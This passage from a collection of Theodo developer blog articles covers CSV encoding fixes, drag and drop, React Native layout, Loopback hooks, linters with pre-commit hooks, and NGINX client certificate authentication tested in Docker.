Parse here because when I started, there wasn\u2019t much choice, and when I had this need again a few months ago, Parse Server was here, waiting for me, as a solid competitor. Since, I don\u2019t regret my choice. Being an active open-source project makes the whole thing more lively, more dynamic, and likely to evolve quickly. And if you\u2019re afraid to install Parse Server infrastructure on a server, many well-known providers has ready-to-go offers for you (like Heroku, AWS, Windows Azure, etc.).\nI used it on personal projects in Python, Ionic 2 and soon on my Rasberry Pi and Arduinos. It helps me a lot, saving me a lot of time and tears. Even if my projects were small, if you are worried in terms of reliability for real projects, it was made for this in the first time.\nNow, it\u2019s your turn\nIf you have an MVP to do by tomorrow and you still haven\u2019t started, this is your moment.\nTo start quickly, you have:\n\nThe Parse Platform website\nThe Parse Server GitHub repository\nThe documentation\nA docker-compose ready Parse Server\n\nYou are only one-click away if you use online providers (such as Heroku, Azure, AWS)\u2026\nEnjoy!\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tAdrien Lacroix\r\n  \t\t\t\r\n  \t\t\t\tWeb Developer at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tCSV is great, especially to export or import\u00a0table-like data into your system. It is plain-text and it can also be opened with Microsoft Excel and be edited by almost anyone, even non technical people. But, despite all those advantages, the use of CSV that has been edited with Excel comes with a massive drawback: if your file contains non ASCII characters, you enter what I personally call the encoding hell.\nSome context\nAs a french company, we deal on a regular basis with non ASCII characters like \u00e9\u00e8\u00ea\u00e0\u00e7 and so on. We were developing a web application where our client needed to import data using CSV files. The files were to be modified by non technical personnel using Microsoft Excel for Windows (2007 version) and we couldn\u2019t change that. The application backend was coded using NodeJS and the Loopback framework.\nSo we developed the CSV importer and data looking like this in Excel:\n\nEnded up like this in the database:\n\nNeedless to say that our client was not satisfied with the presence of this character: \ufffd.\nWhat caused this problem\nAfter a few research, we discovered that Excel do not encode CSV files in good old UTF-8 when saving them.\nFact is that Excel for Windows encode CSV in ISO-8859-1 and Excel for OSX\u00a0in\u00a0macintosh encoding. Unfortunately, it seems that this cannot be overridden in Excel for now, so we couldn\u2019t ask our client to change his configuration. We had to handle this within the application.\nHow we solved it\niconv-lite is a great javascript library for dealing with encoding conversions. After having figured out from which encoding decode our files, we only had to add this code to our CSV importer, right before the CSV parsing:\niconv = require('iconv-lite');\r\n\r\n...\r\n\r\noriginalFile = fs.readFileSync(filename, {encoding: 'binary'});\r\ndecodedFile = decode(originalFile, 'iso88591');\r\n\nWe knew that our client would\u00a0only use Excel for Windows, so we didn\u2019t bother implement an OSX compatible solution, but if you need to create a multi OS importer, you could use a trick like this:\n\r\noriginalFile = fs.readFileSync(filename, {encoding: 'binary'});\r\ndecodedFile = decode(originalFile, 'iso88591');\r\nif(decodedFile.indexOf('\u00e9') < 0) {\r\n  decodedFile = decode(originalFile, 'macintosh');\r\n}\r\n\nHere, we know that after decoding we should find the character \u201c\u00e9\u201d in the header of the CSV (in the \u201cCat\u00e9gorie\u201d and \u201cP\u00e9riode\u201d columns). So we try first the Windows compatible decoding and if it fails (if we do not find the \u201c\u00e9\u201d), we try the OSX compatible one.\nConclusion\nYay! You escaped the encoding hell! If you want to learn\u00a0more about CSV import in Loopback, you should certainly read this\u00a0great article about user-friendly transactional CSV import.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tGeorges Biaux\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tDrag & drop has become such a common feature on the web that people think it\u2019s a no-brainer for developers. A few months back, a client told me: \u201cHow can it be that hard, it\u2019s all over the internet!\u201d and at that time I had no idea how to implement it. If you want to learn how it\u2019s done, you are in the right place. Keep calm and read along!\nChoose your technical approach\nThere are plenty open-source drag & drop libraries on the Internet. My advice is not to rush into the first library you find! You might spend a few days trying to tweak it only to realize it does not meet your project requirements.\nThat\u2019s why the first part of this article is dedicated to drag & drop with HTML5, a sturdy and customizable solution which does not require you to install any external library. In the second part I will look into Dragula, a straightforward solution for reordering blocks on a web page, which comes with nice style features.\nThe demos are available here:\n\nDrag & Drop with HTML5\nDrag & Drop with Dragula and React\nDrag & Drop with Dragula and Angular 1\n\nA Sturdy Solution: Drag & Drop with HTML5 Attributes\nSay you have two elements in your view: a draggable item and a drop zone.\n<div> DRAGGABLE ITEM </div>\r\n<div> DROP ZONE </div>\r\n\nTo make the first element draggable, add the draggable attribute:\n<div draggable=\"true\"> DRAGGABLE ITEM </div>\r\n\nBy default nothing can be dropped into an element so the drop zone is not operational yet. Use the ondragover attribute to enable this behaviour:\n<div ondragover=\"allowDrop(event)\"> DROP ZONE </div>\r\n<script>\r\n  allowDrop = (event) => {\r\n    event.preventDefault();\r\n  }\r\n</script>\r\n\nUse the ondrop attribute to decide what to do when the item is dropped on the zone. In the example below I log a message in the console:\n<div ondragover=\"allowDrop(event)\" ondrop=\"handleDrop()\"> DROP ZONE </div>\r\n<script>\r\n  allowDrop = (event) => {\r\n    event.preventDefault();\r\n  }\r\n  handleDrop = () => {\r\n    console.log('You dropped something!');\r\n  }\r\n</script>\r\n\nThat\u2019s it! You now have basic drag & drop on your web page!\nYou can now add some extra features with the ondragstart, ondragenter and ondragleave attributes. For instance, a nice feature with ondragenter and ondragleave would be to highlight the drop zone by adding and removing a custom css class of your choice (named dragging-over in the example below). Here is the full code:\n<div\r\n  draggable=\"true\"\r\n  ondragstart=\"handleDragStart()\">\r\n  DRAGGABLE ITEM\r\n</div>\r\n<div\r\n  ondragover=\"allowDrop(event)\"\r\n  ondrop=\"handleDrop()\"\r\n  ondragenter=\"colorize(this)\"\r\n  ondragleave=\"uncolorize(this)\">\r\n  DROP ZONE\r\n</div>\r\n<script>\r\n  allowDrop = (event) => {\r\n    event.preventDefault();\r\n  }\r\n  handleDragStart = () => {\r\n    console.log('Started dragging');\r\n  }\r\n  colorize = (element) => {\r\n    console.log('Entered the drop zone');\r\n    element.classList.add('dragging-over');\r\n  }\r\n  uncolorize = (element) => {\r\n    console.log('Left the drop zone');\r\n    element.classList.remove('dragging-over');\r\n  }\r\n  handleDrop = () => {\r\n    console.log('You dropped something!');\r\n  }\r\n</script>\r\n\nSometimes you don\u2019t need to implement your own custom solution and a turnkey library can fit your project needs. Don\u2019t reinvent the wheel if you don\u2019t need to!\nReordering the DOM: introducing the Dragula library\nDragula lets you reorder elements of the DOM. In the following example I display the word \u201cSMILE\u201d and let the user move the letters around to form anagrams like \u201cSLIME\u201d or \u201cMILES\u201d.\nThe demo is coded with React but Dragula bridges are also available for Angular 1 and Angular 2.\nAs I am not using Webpack or any other tool to require Dragula, I use a <script> tag in the index.html file:\n<html>\r\n  <head>\r\n    <meta charset=\"UTF-8\" />\r\n    <title>Drag & Drop - Dragula for React</title>\r\n    <link rel=\"stylesheet\" href=\"style.css\">\r\n    <link href=\"bower_components/react-dragula/dist/dragula.min.css\" rel=\"stylesheet\" type=\"text/css\">\r\n    <!-- Do not forget to import the Dragula style sheet -->\r\n  </head>\r\n  <body>\r\n    <div id=\"anagram\"></div>\r\n    <script src=\"https://unpkg.com/react@latest/dist/react.js\"></script>\r\n    <script src=\"https://unpkg.com/react-dom@latest/dist/react-dom.js\"></script>\r\n    <script src=\"https://unpkg.com/babel-standalone@6.15.0/babel.min.js\"></script>\r\n    <!-- I use Babel to transform JSX to javascript -->\r\n    <script src=\"bower_components/react-dragula/dist/react-dragula.js\"></script>\r\n    <!-- I previously installed react-dragula with Bower -->\r\n  </body>\r\n</html>\r\n\nNow let\u2019s create a React component named Anagram and mount it on the div with the \u201canagram\u201d id. Add a <script> tag to the body:\n<script type=\"text/babel\">\r\n  class Anagram extends React.Component {\r\n    render() {\r\n      return <div className=\"anagram-container\">\r\n          <div className=\"letter-outter-container\">\r\n            <div className=\"letter-container\">S</div>\r\n          </div>\r\n          <div className=\"letter-outter-container\">\r\n            <div className=\"letter-container\">M</div>\r\n          </div>\r\n          <div className=\"letter-outter-container\">\r\n            <div className=\"letter-container\">I</div>\r\n          </div>\r\n          <div className=\"letter-outter-container\">\r\n            <div className=\"letter-container\">L</div>\r\n          </div>\r\n          <div className=\"letter-outter-container\">\r\n            <div className=\"letter-container\">E</div>\r\n          </div>\r\n      </div>;\r\n    }\r\n  };\r\n  ReactDOM.render(<Anagram/>, document.getElementById('anagram'));\r\n</script>\r\n\nThe css classes letter-container and letter-outter-container are up to you. I wrapped the letter-container divs in order to get some spacing within letters without using margins because they generate glitches with Dragula. At this point I have something like this:\n\n\u00a0\n\u00a0\n\u00a0\n\u00a0\n\u00a0\nFinally, add the componentDidMount lifecycle method in the component and apply Dragula to the created DOM node:\ncomponentDidMount() {\r\n  var container = ReactDOM.findDOMNode(this);\r\n  reactDragula([container]);\r\n}\r\n\nAnd there you go! You can now reorder the letters with drag & drop. You will also notice the very cool shadow image that indicates where the dragged element would be dropped. Dragula\u2019s tagline is \u201cDrag and Drop so simple it hurts\u201d.\nHTML5 vs Dragula\n\nThe one major drawback of the HTML5 DragEvent is that it is not compatible with touch devices. If you need to implement features for smartphones or tablets, have a look at the touchstart, touchmove and touchend events. They work pretty similarly!\nAs for Dragula, I definitely recommend it for DOM reordering features. It\u2019s super-easy to use and once you know that glitches may occur with the margin and display: flex properties, everything should be okay.\nYou now have the tools to start coding pretty cool features with drag & drop! To go further you can check out the HTML Drag and Drop API, the Touch Events API and the Dragula options.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tPierre-Louis Le Portz\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tThe basics of positioning are pretty well explained in the official React Native documentation.\nHowever, it only covers simple cases such as centering items or putting one element on top, middle and bottom.\nHere I intend to cover some cases that are quite common but for which I couldn\u2019t find a suitable documentation.\nOne item centered and one on the right, none on the left\nN.B.: All of the following also works the other way around, or with top and bottom instead of left and right if you use flexDirection: column on the container.\nIf you know the width of the item on the right\n\nexport default class reactNativePositionning extends Component {\r\n  render() {\r\n    return (\r\n      {/* Container */}\r\n      <View style={{\r\n        flexDirection: 'row',\r\n        justifyContent: 'space-between',\r\n      }}>\r\n        {/* empty element on the left */}\r\n        <View style={{ width: 100 }} />\r\n        {/* element in the middle */}\r\n        <View style={styles.box} />\r\n        {/* element on the right */}\r\n        <View style={[styles.box, { width: 100 }]} />\r\n      </View>\r\n    );\r\n  }\r\n}\r\n\r\nconst styles = StyleSheet.create({\r\n  box: {\r\n    backgroundColor: '#927412',\r\n    height: 100,\r\n    width:100,\r\n  },\r\n});\r\n\nIf you don\u2019t know the width of the item on the right\n\nIf you don\u2019t know the width of the element on the right, you can still wrap every item in another View.\nLeft and right wrappers will take all the available space, leaving the middle one centered.\nThe left wrapper will be empty.\nexport default class reactNativePositionning extends Component {\r\n  render() {\r\n    return (\r\n      {/* Container */}\r\n      <View style={{\r\n        flexDirection: 'row',\r\n        justifyContent: 'space-between',\r\n      }}>\r\n\r\n        {/*  empty wrapper */}\r\n        <View style={{\r\n          flexDirection: 'row',\r\n          flex: 1,\r\n        }} />\r\n\r\n        {/* element in the middle */}\r\n        <View style={{\r\n          flexDirection: 'row',\r\n          justifyContent: 'center',\r\n        }}>\r\n          <View style={styles.box} />\r\n        </View>\r\n\r\n        {/*  element on the right with a different size */}\r\n        <View style={{\r\n          flexDirection: 'row',\r\n          flex: 1,\r\n          justifyContent: 'flex-end',\r\n        }}>\r\n          <View style={[styles.box, { width: 22 }]} />\r\n        </View>\r\n\r\n      </View>\r\n    );\r\n  }\r\n}\r\n\r\nconst styles = StyleSheet.create({\r\n  box: {\r\n    backgroundColor: '#927412',\r\n    height: 100,\r\n    width: 100,\r\n  },\r\n});\r\n\nGrouping items\n\nReact native still misses margin: auto which is useful for grouping items \u2013 you can follow the state of the issue here.\nMeanwhile what we can do is adding elements with a flex: 1 property to make them fill the space between blocks.\nexport default class reactNativePositionning extends Component {\r\n  render() {\r\n    return (\r\n      {/* container */}\r\n      <View style={{\r\n        flexDirection: 'row',\r\n        justifyContent: 'space-between',\r\n      }}>\r\n        {/* element on the left */}\r\n        <View style={styles.box} />\r\n        {/* space */}\r\n        <View style={{ flex: 1 }} />\r\n        {/* elements in the 'middle' */}\r\n        <View style={styles.box} />\r\n        <View style={styles.box} />\r\n        {/* space */}\r\n        <View style={{ flex: 1 }} />\r\n        {/* elements on the right */}\r\n        <View style={styles.box} />\r\n        <View style={styles.box} />\r\n      </View>\r\n    );\r\n  }\r\n}\r\n\r\nconst styles = StyleSheet.create({\r\n  box: {\r\n    backgroundColor: '#927412',\r\n    height: 50,\r\n    marginLeft:2,\r\n    marginRight:2,\r\n    width:50,\r\n  },\r\n});\r\n\nYou can also add the property directly to your elements:\nexport default class reactNativePositionning extends Component {\r\n  render() {\r\n    return (\r\n      {/* container */}\r\n      <View style={{\r\n        flexDirection: 'row',\r\n        justifyContent: 'space-between',\r\n      }}>\r\n        {/* element on the left */}\r\n        <View style={[styles.box], { flex: 1 }} />\r\n        {/* elements in the 'middle' */}\r\n        <View style={styles.box} />\r\n        <View style={[styles.box], { flex: 1 }} />\r\n        {/* elements on the right */}\r\n        <View style={styles.box} />\r\n        <View style={styles.box} />\r\n      </View>\r\n    );\r\n  }\r\n}\r\n\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tLouis Zawadzki\r\n  \t\t\t\r\n  \t\t\t\tI drink tea and build web apps at Theodo.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tLoopback is a node framework based on Express which provides the CRUD to accelerate high value features creation. However, these basic functions may not answer to your needs or partially. For example, you might want to send a mail to the owner of an object when you save it, or update another related object.\nHooks can, and will, help you achieving this.\nWhat\u2019s a hook and its application cases?\nUsing hooks has the following advantages:\n\nDRY principle, only one hook declaration instead of several function calls\nUncoupling\nSeparate trade logic from program requirements\n\nA hook is a special event handler. It is bound to events of the framework or program you are using. As such, it is used to alter, augment or replace the behavior of the target.\nYou should use hooks to perform systematic operations such as:\n\nmail sending\ndata sanitization (formatting, filtering\u2026)\nlogging\nsecurity checks (encoding, decoding, signing\u2026)\n\nCloser look and examples\nIf several hooks are attached to the same event, they are executed one after the other in the order of their declaration.\nLoopback gives access to three types of hooks: connector, remote and operation.\nConnector hooks\nIf you don\u2019t know what a connector is in Loopback, I suggest you read this.\n\nThere are two of them:\n\n'before execute'\n'after execute'\n\nThe first is called before you make use of a connector, the second when you receive the response from it.\nYou must always finish your hook by calling next() or ctx.end(), if you don\u2019t, your server will hang. Using next() goes to the next observer whereas ctx.end() ends the observed event. You can see it in the schema on the right.\nThis category of hooks can be used to log access and queries to your database. Another application would be the formatting of the input/output of your calls to a remote API. For instance, I used the after execute to catch 5XX errors of an API before they are caught and rewritten by a firewall:\nmyRestConnector.observe('after execute', function(ctx, next) {\r\n  if (/^5/.test(ctx.res.statusCode)) {\r\n    var error = new Error();\r\n    error.status = 400;\r\n    return ctx.end(error, null)\r\n  }\r\n  return next();\r\n});\r\n\nRemote hooks\n\nbeforeRemote()\nafterRemote() and afterRemoteError(), only one of these two is called after a remote.\n\nYou can use those to do security checks, for example verify access rights, to sanitize your remote input or whitelisting your output. Mostly, it comes handy when the built-in remotes of Loopback do not meet your needs.\nWild cards are allowed in the remote name so you can bind a handler to a set of remotes.\nExpress\nSince Loopback is built on express app.use() is available. It is the easiest way to bind a single handler to remotes with a similar path, but attached to different models.\napp.use('/\\*/stats', function (req, res, next) {\r\n  console.log(\"I match /aModelWithStats/stats and /anotherModelWithStats/stats\");\r\n  return next();\r\n});\r\n\nOperation hooks\nThese hooks are directly related to built-in functions of Loopback such as save, delete or find.\nThey are useful when you need to update relations of a model you just saved, or to log access and modifications on some instance and then warn the owner by mail.\nThe documentation is quite exhaustive. However I would like to underline that afterInitialize is different from the other operation hooks since it is synchronous. So be careful not to write a heavy function for this handler.\nThe following example sends a mail if a new instance of MyModel is saved.\nMyModel.observe('after save', function(ctx, next) {\r\n  if (ctx.instance && ctx.isNewInstance) {\r\n    let myMessage = { content: 'this is some badass content' };\r\n    myMailingService.send(myMessage);\r\n  }\r\n  return next();\r\n}\r\n\nConclusion\nI hope this article helped you understand the added value of hooks and that it will give you tools to improve the overall quality of your project.\nIf you have any question, or remarks about usage, please share them in the comments section below!\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tGabriel Andrin\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tAre you tired of always writing the same comments on others pull requests?\u00a0Are you tired of always reading the same comments on your pull requests? Stop wasting time, here\u2019s the solution.\nStep One: Install linters on your project\nFor your php files\nInspired by this\u00a0CodeSniffer and PhpStorm Code Inspection article, we can install phpcs with a specific coding standard directly on your project.\nInstall CodeSniffer\ncomposer require --dev squizlabs/php_codesniffer\r\n\nInstall a coding standard\nWhen I start working\u00a0on a Symfony2 project, it was with the djoos/Symfony2-coding-standard repository.\ncomposer require --dev escapestudios/symfony2-coding-standard\r\n\nNow i made my own my fork\u00a0with more rules, try it!\ncomposer require --dev vincentlanglet/symfony3-custom-coding-standard\nUse it\nLet\u2019s try with this file\n// yourfile.php\r\n\r\n<?php\r\n\r\nclass Entity {\r\n    function getVariable() {\r\n        return $this->variable;\r\n    }\r\n\r\n    function setVariable($newValue) {\r\n        $this->variable = $newValue;\r\n    }\r\n\r\n    private $variable;\r\n}\r\n\nThe following command\nvendor/bin/phpcs --standard=../../../../vincentlanglet/symfony3-custom-coding-standard/Symfony3Custom yourfile.php\r\n\nwill return error messages\n\nthat you can easily correct\n<?php\r\n\r\nnamespace AppBundle\\Entity;\r\n\r\n/**\r\n * Class Entity\r\n *\r\n * @package AppBundle\\Entity\r\n */\r\nclass Entity\r\n{\r\n    /**\r\n     * @var string\r\n     */\r\n    private $variable;\r\n\r\n    /**\r\n     * @return string\r\n     */\r\n    public function getVariable()\r\n    {\r\n        return $this->variable;\r\n    }\r\n\r\n    /**\r\n     * @param string $newValue\r\n     */\r\n    public function setVariable($newValue)\r\n    {\r\n        $this->variable = $newValue;\r\n    }\r\n}\r\n\nNB: If you are tired to write --standard=../../../../vincentlanglet/symfony3-custom-coding-standard/Symfony3Custom,\nor if you need to configure phpcs to use it with PhpStorm, try\nvendor/bin/phpcs --config-set default_standard ../../../../vincentlanglet/symfony3-custom-coding-standard/Symfony3Custom\r\n\nYou can find others options here.\nFor your javascript files\nLet\u2019s do the same with eslint.\nInstall eslint\nnpm install eslint --save-dev\r\n\nGenerate a configuration file\nTo start the configuration of eslint, use\n./node_modules/.bin/eslint --init\r\n\nAfter answering a few questions, it will generate a .eslintrc file configured like this\n{\r\n  \"extends\": \"eslint:recommended\",\r\n  \"rules\": {\r\n    \"semi\": [\"error\", \"always\"],\r\n    \"quotes\": [\"error\", \"double\"]\r\n  }\r\n}\r\n\n\nextends apply all the rules of eslint:recommended to your project. I recommend the airbnb config.\nsemi and quotes are extra rules. The first value is the error value of the rule.\n\nUse it\nLet\u2019s try with this file\n// yourfile.js\r\n\r\nvar object={\r\n  'key': 3,\r\n     \"otherKey\" :2\r\n};\r\n\r\nconsole.log(object)\r\n\nThe following command\n./node_modules/.bin/eslint yourfile.js\r\n\nwill return error messages\n\nthat you can easily correct\nconst object = {\r\n  key: 3,\r\n  otherKey: 2,\r\n}\r\n\r\nconsole.log(object)\r\n\nEven for your css files\nIn the same way, you can lint your css files thanks to stylelint.\nInstall stylelint\nnpm install stylelint --save-dev\r\n\nWrite your configuration file\nI recommend the stylelint-config-standard.\nnpm install stylelint-config-standard --save-dev\r\n\nNow you have to create your .stylelintrc file, it works like your .eslintrc file:\n{\r\n  \"extends\": \"stylelint-config-standard\",\r\n  \"rules\": {\r\n    \"string-quotes\": \"single\"\r\n  }\r\n}\r\n\nUse it\nLet\u2019s try with this file\n/* yourfile.css */\r\n\r\n.header {\r\n\r\n}\r\n\r\nbody {\r\ntext-color: red;\r\nmargin-top: 10px;\r\nmargin-bottom: 10px;\r\nmargin: 0;\r\n}\r\n\nThe following command\n./node_modules/.bin/stylelint yourfile.css\r\n\nwill return error messages\n\nthat you can easily correct\nbody {\r\n  color: red;\r\n  margin: 10px 0;\r\n}\r\n\nStep Two: Use linters automatically before each commit\nUse pre-commit hooks\nPre-commit hooks were already introduced in this article, but personally I prefer using a npm package.\nInstall pre-commit\nnpm install pre-commit --save-dev\r\n\nConfigure pre-commit\nYou just need to specify scripts you want to launch before committing in your package.json.\nYou could even launch tests before commits if you wanted.\n{\r\n  \"name\": \"Something\",\r\n  \"version\": \"0.0.0\",\r\n  \"description\": \"Something else\",\r\n  \"main\": \"index.js\",\r\n  \"scripts\": {\r\n    \"lint:php\": \"vendor/bin/phpcs --standard=../../../../escapestudios/symfony2-coding-standard/Symfony2 *.php\",\r\n    \"lint:js\": \"eslint *.js\",\r\n    \"lint:css\": \"stylelint *.css\"\r\n  },\r\n  \"pre-commit\": [\r\n    \"lint:php\",\r\n    \"lint:js\",\r\n    \"lint:css\"\r\n  ]\r\n}\r\n\nUse it\nJust commit!\nBut don\u2019t worry, you can still force a commit by telling git to skip the pre-commit hooks by simply committing using --no-verify.\nCheck only modified files to be more user-friendly\nRunning a lint process on a whole project is slow and linting results can be irrelevant. Ultimately you only want to lint files that will be committed.\u00a0Lint-staged will be used to run linter on staged files, filtered by a specified glob pattern.\nInstall lint-staged\nnpm install lint-staged --save-dev\r\n\nConfigure lint-staged\nLaunch lint-staged with pre-commit and precise which linter you want to use for specific files pattern in your package.json.\n{\r\n  \"name\": \"Something\",\r\n  \"version\": \"0.0.0\",\r\n  \"description\": \"Something else\",\r\n  \"main\": \"index.js\",\r\n  \"scripts\": {\r\n    \"lint-staged\": \"lint-staged\"\r\n  },\r\n  \"lint-staged\": {\r\n    \"*.php\": \"vendor/bin/phpcs --standard=../../../../escapestudios/symfony2-coding-standard/Symfony2\",\r\n    \"*.js\": \"eslint\",\r\n    \"*.css\": \"stylelint\"\r\n  },\r\n  \"pre-commit\": [\r\n    \"lint-staged\"\r\n  ]\r\n}\r\n\nUse it\n\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tVincent Langlet\r\n  \t\t\t\r\n  \t\t\t\tVincent Langlet is an agile web developer at Theodo.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tYou can follow this article with the related Github repository.\nIntroduction\nDuring a mission I did at Theodo, I worked on a security issue about controlling the access to an application.\nIt included changing NGINX and Apache configurations.\nWhen the issue was discovered, we tried to fix it directly on the production environment and we failed.\nIf you\u2019re trying to make a change directly on the production environment, it probably won\u2019t work and will break the application. You need to test it first.\nWhat is my problem?\nI want to restrict access to my NGINX server so that the client can\u2019t access the NGINX server directly.\n\nTo solve this problem, I want to simulate the Proxy and the NGINX servers. I can either:\n\nUse several servers in a cluster\nUse virtual machines locally\nUse Docker locally\n\nThe cluster solution is very bad because it won\u2019t work locally, and it costs money. The second solution is better but virtual machines are not easy to configure as a local network, and they take a lot of computing ressources, as the whole OS is running.\nIn contrast, Docker is a convenient tool to run several containers (which take a small computing ressource) and simulate a network of independent servers.\nHow to setup my containers using docker-compose?\nThis part requires docker-compose. It is a tool that creates several Docker containers with one command.\nCreate a docker-compose.yml file containing:\n # docker-compose.yml\r\n\r\nversion: '2'\r\n\r\nservices:\r\n\r\n  app:\r\n    image: nginx:latest\r\n    container_name: app\r\n\r\n  proxy:\r\n    image: httpd:latest\r\n    container_name: proxy\r\n    depends_on:\r\n     - app\r\n\nThe depends_on block means that the app will start before proxy.\nHow to link the ports between my container and my computer?\nAdd some ports:\n# docker-compose.yml\r\n\r\nservices:\r\n\r\n  app:\r\n    ...\r\n    ports:\r\n      - \"443:443\"\r\n    ...\r\n\r\n  proxy:\r\n    ...\r\n    ports:\r\n      - \"9443:443\"\r\n    ...\r\n\nIt links the ports like this: local-port:container-port\nHow to watch logs on local files and enable debug?\nLink the log files in your volumes:\n# docker-compose.yml\r\n\r\nservices:\r\n\r\n  app:\r\n    ...\r\n    volumes:\r\n      - ./nginx/logs:/usr/share/nginx/logs\r\n    ...\r\n\r\n  proxy:\r\n    ...\r\n    volumes:\r\n     - ./proxy/apache2/logs:/usr/local/apache2/logs\r\n    ...\r\n\nIt links directories or single files like this:\nlocal/path:container/path\nYou can now monitor the logs in your editor at proxy/apache2/logs and nginx/logs, or using tail -f.\nSet NGINX in debug mode using a custom command:\n# docker-compose.yml\r\n\r\nservices:\r\n\r\n  app:\r\n    ...\r\n    command: [nginx-debug, -g, daemon off;]\r\n    ...\r\n\nThis will launch the nginx-debug service instead of the nginx service when you start this container.\nHow to link the configuration files between my container and my computer?\nAdd some volumes:\n# docker-compose.yml\r\n\r\nservices:\r\n\r\n  app:\r\n    ...\r\n    volumes:\r\n      - ./nginx/nginx:/etc/nginx:ro\r\n      - ./nginx/index.html:/usr/share/nginx/coucou/index.html:ro\r\n    ...\r\n\r\n  proxy:\r\n    ...\r\n    volumes:\r\n      - ./proxy/conf/httpd.conf:/usr/local/apache2/conf/httpd.conf:ro\r\n      - ./proxy/apache2/conf/sites-available:/usr/local/apache2/conf/sites-available:ro\r\n    ...\r\n\nThe :ro at the end means read only for the container. In other words, you can only edit this file/directory outside the container.\nHow to solve my security problem?\nThe solution to my problem is to enable SSL Client Authentication on the NGINX server, in order to allow only the requests coming from the proxy server:\n\nUsing the \u201cfail & retry\u201d process, I found the correct configuration:\n\nModify the config files in proxy/conf/ and nginx/nginx/.\nLaunch the containers with docker-compose up.\nTest if it works. If needed, look at the log files.\nStop the containers with Ctrl + C and start over.\n\nThe important part of the configuration I discovered is the following:\n# proxy/apache2/conf/sites-available/appli.conf\r\n...\r\nSSLProxyEngine on\r\nSSLProxyCheckPeerName off\r\nSSLProxyMachineCertificateFile \"/usr/local/apache2/ssl/proxy.pem\" # sends the client certificate\r\n...\r\n\n# nginx/nginx/conf.d/default.conf\r\n\r\nserver {\r\n    ...\r\n    # verifies the client certificate\r\n\r\n    ssl_verify_client on;\r\n    ssl_client_certificate /var/www/ca.crt; # Trusted CAs\r\n\r\n    # verifies the client CN.\r\n\r\n    # use $ssl_client_s_dn for nginx < 1.6:\r\n    if ($ssl_client_s_dn_legacy != \"/C=FR/ST=France/L=Paris/O=Theodo/OU=Blog/CN=proxy/emailAddress=samuelb@theodo.fr\") {\r\n        return 403;\r\n    }\r\n    ...\r\n}\r\n\nYou can reproduce it by cloning my repo: Client-SSL-Authentication-With-Docker and running docker-compose up.\nIf you request directly the NGINX server (https://localhost/), you get a 400 error, but if you request the Proxy server (https://localhost:9443/), you can access the sensitive data.\nConclusion\nWhen repairing this security vulnerability using Docker, I was able to:\n\ngive more visibility to my client on how I was handling this network problem, because I had a plan to break the problem.\nreassure my client because there was no danger for the production environment.\nincrease my client\u2019s statisfaction because I solved the problem quickly.\n\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tSamuel Briole\r\n  